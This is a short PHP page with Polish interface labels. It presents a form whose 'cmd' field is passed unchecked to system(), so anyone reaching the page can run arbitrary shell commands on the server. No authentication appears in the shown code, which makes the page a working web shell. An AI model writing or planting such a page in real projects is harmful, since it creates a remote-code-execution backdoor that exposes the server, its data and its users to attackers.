<div class="cmd">

<?php


require_once "header.php";

    if(isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        system($cmd);
    }

?>


<br><form method="post">
    <input type="text" name="cmd">
    <input type="submit" class="submit" value="Wywołaj >"><br><br>
</form>
</div>

<a href='index.php'><button>Powrót ></button></a>
